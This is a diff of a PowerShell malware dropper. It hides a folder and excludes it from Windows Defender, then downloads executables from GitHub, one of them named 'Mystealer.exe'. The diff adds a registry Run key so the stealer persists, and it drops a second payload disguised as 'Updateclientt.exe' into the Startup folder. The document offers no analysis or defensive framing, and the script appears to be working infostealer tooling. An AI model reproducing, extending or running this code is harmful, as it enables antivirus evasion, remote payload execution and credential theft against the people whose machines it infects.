@@ -6,10 +6,13 @@ New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 
-$url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
-$output = "$startupfolder\Updateclientt.exe"
-Invoke-WebRequest -Uri $url -OutFile $output
-
 $url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/haha.exe"
 $output = "$dir\Mystealer.exe"
+Invoke-WebRequest -Uri $url -OutFile $output
+$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+$appName = "StartupUmbreal"
+Set-ItemProperty -Path $regPath -Name $appName -Value "`"$output`""
+
+$url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
+$output = "$startupfolder\Updateclientt.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
